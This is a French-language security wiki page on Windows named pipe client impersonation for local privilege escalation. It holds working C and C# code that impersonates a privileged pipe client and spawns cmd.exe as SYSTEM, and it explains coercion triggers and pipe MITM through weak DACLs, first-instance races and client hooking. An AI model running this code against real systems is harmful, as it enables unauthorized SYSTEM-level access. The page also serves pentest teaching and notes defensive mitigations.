# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation est une primitive de local privilege escalation qui permet à un thread de named-pipe server d'adopter le security context d'un client qui s'y connecte. En pratique, un attaquant capable d'exécuter du code avec SeImpersonatePrivilege peut contraindre un client privilégié (par exemple, un service SYSTEM) à se connecter à un pipe contrôlé par l'attaquant, appeler ImpersonateNamedPipeClient, dupliquer le token obtenu en primary token et lancer un processus en tant que client (souvent NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Cette page se concentre sur la technique principale. Pour les exploit chains de bout en bout qui contraignent SYSTEM à se connecter à votre pipe, consultez les pages de la famille Potato référencées ci-dessous.

## TL;DR
- Créer un named pipe : \\.\pipe\<random> et attendre une connexion.
- Faire en sorte qu'un composant privilégié s'y connecte (spooler/DCOM/EFSRPC/etc.).
- Lire au moins un message depuis le pipe, puis appeler ImpersonateNamedPipeClient.
- Ouvrir le token d'impersonation du thread actuel, appeler DuplicateTokenEx(TokenPrimary), puis CreateProcessWithTokenW/CreateProcessAsUser pour obtenir un processus SYSTEM.<sup>[[2]](#references)</sup>

## Prérequis et APIs principales
- Privilèges généralement nécessaires pour le processus/thread appelant :
- SeImpersonatePrivilege pour réussir à usurper l'identité d'un client qui se connecte et pour utiliser CreateProcessWithTokenW.
- Alternativement, après avoir usurpé l'identité de SYSTEM, vous pouvez utiliser CreateProcessAsUser, ce qui peut nécessiter SeAssignPrimaryTokenPrivilege et SeIncreaseQuotaPrivilege (ces privilèges sont disponibles lorsque vous usurpez l'identité de SYSTEM).
- APIs principales utilisées :<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (il faut lire au moins un message avant l'impersonation)
- ImpersonateNamedPipeClient et RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Niveau d'impersonation : pour effectuer des actions utiles localement, le client doit autoriser SecurityImpersonation (valeur par défaut pour de nombreux clients RPC/named-pipe locaux). Les clients peuvent réduire ce niveau avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION lors de l'ouverture du pipe.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes :
- Si ImpersonateNamedPipeClient retourne ERROR_CANNOT_IMPERSONATE (1368), assurez-vous d’avoir d’abord lu depuis le pipe et que le client n’a pas limité l’impersonation au niveau Identification.
- Préférez DuplicateTokenEx avec SecurityImpersonation et TokenPrimary pour créer un token primaire adapté à la création de processus.

## Exemple rapide en .NET
Dans .NET, NamedPipeServerStream peut effectuer une impersonation via RunAsClient. Une fois l’impersonation effectuée, dupliquez le token du thread et créez un processus.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Déclencheurs/coercitions courants pour obtenir SYSTEM sur votre pipe
Ces techniques contraignent des services privilégiés à se connecter à votre named pipe afin que vous puissiez les impersonate :
- Print Spooler RPC trigger (PrintSpoofer)
- Variantes d’activation DCOM/NTLM reflection (RoguePotato/JuicyPotato[NG], GodPotato)
- Pipes EFSRPC (EfsPotato/SharpEfsPotato)

Consultez l’utilisation détaillée et la compatibilité ici :

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si vous avez simplement besoin d’un exemple complet de création du pipe et d’impersonation pour lancer SYSTEM depuis un service trigger, consultez :

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abus de Named Pipe IPC & MITM (ACLs, First-Instance Races, Client Hooking)

Lorsqu’un service privilégié et un processus à faibles privilèges communiquent via `\\.\pipe\...`, considérez le pipe comme toute autre frontière IPC non fiable. Au-delà de l’impersonation classique côté serveur, des ACLs faibles du pipe, des flags de création dangereux et des décisions de confiance côté client peuvent tous devenir des primitives d’escalade de privilèges locale.<sup>[[7]](#references)</sup>

### Énumérez d’abord les pipes candidats
- Listez rapidement les pipes depuis PowerShell : `Get-ChildItem \\.\pipe\`
- L’outil Sysinternals `pipelist64.exe` est utile pour repérer le nombre d’instances et les pipes à instance unique.
- Donnez la priorité aux noms utilisés par des services exécutés en tant que `SYSTEM`, notamment les helpers, updaters, launchers et UI brokers.

### MITM via des DACLs permissives et des instances de pipe supplémentaires
- Tout processus pouvant communiquer avec un serveur privilégié peut déjà fuzz son protocole et rechercher des verbes privilégiés.<sup>[[7]](#references)</sup>
- Le cas le plus intéressant se présente lorsque la DACL accorde `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sur l’objet pipe. Pour les named pipes, cela inclut implicitement `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` partage le même bit), ce qui permet à un attaquant de créer une autre instance serveur avec le même nom.
- Comme les instances sont associées dans l’ordre FIFO, les instances créées par l’attaquant et les instances légitimes peuvent être entremêlées : créez une instance rogue avec `CreateNamedPipe`, puis ouvrez le même nom de pipe avec `CreateFile`, et attendez qu’un client réel se connecte à l’instance serveur rogue.
- Résultat : observer, modifier, relayer ou désynchroniser un IPC privilégié sans avoir besoin de prendre le contrôle du processus serveur d’origine.

### First-instance race sur les descripteurs de sécurité du pipe
- `lpSecurityAttributes` définit la DACL uniquement lors de la création de la première instance d’un nom de pipe.<sup>[[4]](#references)[[7]](#references)</sup>
- Si un service privilégié démarre tardivement et n’utilise pas `FILE_FLAG_FIRST_PIPE_INSTANCE`, un attaquant peut précréer le nom du pipe avec une DACL permissive, puis laisser le service créer les instances suivantes dans le contexte de sécurité choisi par l’attaquant.
- Cela transforme le démarrage du service en condition de course : remportez la première instance, puis connectez-vous aux clients suivants ou effectuez un MITM en exploitant l’ACL affaiblie.
- Mitigation côté défenseurs, et point essentiel à vérifier pour les attaquants : vérifiez si `CreateNamedPipe(..., dwOpenMode, ...)` inclut `FILE_FLAG_FIRST_PIPE_INSTANCE`. Si ce n’est pas le cas, testez la précréation avant le démarrage du service.

### Les vérifications de PID/signature renforcent la sécurité, mais ne constituent pas une frontière
- Certains produits tentent de restreindre l’accès en vérifiant `GetNamedPipeClientProcessId`, le chemin de l’image du processus ou le signataire Authenticode du client qui se connecte.<sup>[[7]](#references)</sup>
- Cela n’est utile que jusqu’à l’injection dans le client légitime : une fois à l’intérieur du processus de confiance, vous héritez exactement du contexte PID/image/signature attendu par le serveur.
- Pour les applications split desktop, instrumenter le processus UI/helper à faibles privilèges est souvent plus facile que d’attaquer directement le service `SYSTEM`.

### Hookez le client en fonction de son modèle d’I/O
- I/O synchrone : interceptez `NtWriteFile` avant que le syscall ne consomme le buffer, et inspectez/modifiez `NtReadFile` après son retour.<sup>[[7]](#references)</sup>
- I/O overlapped : stockez le `OVERLAPPED`/`IoStatusBlock` observé dans `NtReadFile`, puis inspectez le buffer après le retour de `GetOverlappedResult` ou la fin de l’attente correspondante.
- Completion ports : `GetQueuedCompletionStatus` atteint `NtRemoveIoCompletion` ; le `ApcContext` retourné renvoie vers le `OVERLAPPED` utilisé par la lecture d’origine, ce qui constitue le bon pivot pour retrouver le buffer désormais rempli.
- Completion routines (`ReadFileEx`) : le callback de completion est délivré sous forme d’APC. Si vous voulez altérer les données retournées ou injecter des réponses synthétiques, hookez la véritable completion routine et, pour une injection personnalisée, utilisez un dispatcher `QueueUserAPC` à un argument qui reconstruit les 3 arguments attendus par la routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Notes sur les outils
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy le trafic named-pipe via une DLL helper injectée et fournit un workflow similaire à Burp pour l’édition et le replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adopte une approche basée sur Frida et se concentre sur le hooking de `NtReadFile`/`NtWriteFile` ainsi que sur les pivots async/completion ci-dessus, puis transfère le trafic vers un workflow d’édition basé sur WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considérations opérationnelles
- Les named pipes ont une faible latence ; de longues pauses lors de l’édition des buffers peuvent bloquer des services fragiles.<sup>[[7]](#references)</sup>
- Les clients utilisant Overlapped/completion-port/APC nécessitent des hooks différents de simples detours de `ReadFile`/`WriteFile`.
- L’injection dans le client de confiance est bruyante et doit généralement être réservée au développement d’exploits, au reverse engineering de protocoles ou au fuzzing en laboratoire local.

## Dépannage et pièges
- Vous devez lire au moins un message depuis le pipe avant d’appeler ImpersonateNamedPipeClient ; sinon, vous obtiendrez ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Si le client se connecte avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, le serveur ne peut pas effectuer une impersonation complète ; vérifiez le niveau d’impersonation du token via GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW nécessite SeImpersonatePrivilege pour l’appelant. Si l’appel échoue avec ERROR_PRIVILEGE_NOT_HELD (1314), utilisez CreateProcessAsUser après avoir déjà effectué une impersonation de SYSTEM.
- Assurez-vous que le descripteur de sécurité de votre pipe autorise le service cible à se connecter si vous le sécurisez ; par défaut, les pipes sous \\.\pipe sont accessibles conformément à la DACL du serveur.<sup>[[3]](#references)</sup>

## Références

- [1] [Windows : documentation d’ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team : élévation de privilèges via les named pipes Windows](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft : sécurité et droits d’accès des named pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft : fonction CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft : serveur de named pipe utilisant des routines de completion](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – un outil proxy de named pipes Windows](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv : Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv : thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
